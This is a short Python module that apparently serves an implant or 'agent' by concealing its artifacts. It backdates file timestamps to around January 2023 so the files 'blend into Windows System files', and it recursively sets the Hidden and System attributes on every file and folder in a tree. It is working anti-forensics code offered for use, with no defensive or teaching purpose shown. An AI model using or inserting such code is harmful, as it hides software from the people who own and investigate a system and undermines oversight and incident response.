"""Cloaking: file attributes and timestamp masking for agent artifacts."""

from __future__ import annotations

import ctypes
import os
import sys

IS_WINDOWS = os.name == "nt"

FILE_ATTRIBUTE_HIDDEN = 0x02
FILE_ATTRIBUTE_SYSTEM = 0x04


def cloak_path(path: str) -> bool:
    """Set Hidden and System attributes on Windows, and touch mtime/atime."""
    if not os.path.exists(path):
        return False
    # Backdate mtime/atime to blend into Windows System files (e.g. system file timestamp)
    try:
        # 1672531199 = ~Jan 1 2023
        os.utime(path, (1672531199, 1672531199))
    except Exception:
        pass

    if IS_WINDOWS:
        try:
            attrs = ctypes.windll.kernel32.GetFileAttributesW(path)
            if attrs != -1:
                ctypes.windll.kernel32.SetFileAttributesW(
                    path, attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
                )
                return True
        except Exception:
            return False
    return True


def cloak_tree(directory: str) -> int:
    """Recursively cloak all files and subdirectories."""
    count = 0
    if not os.path.exists(directory):
        return 0
    cloak_path(directory)
    count += 1
    for root, dirs, files in os.walk(directory):
        for d in dirs:
            cloak_path(os.path.join(root, d))
            count += 1
        for f in files:
            cloak_path(os.path.join(root, f))
            count += 1
    return count
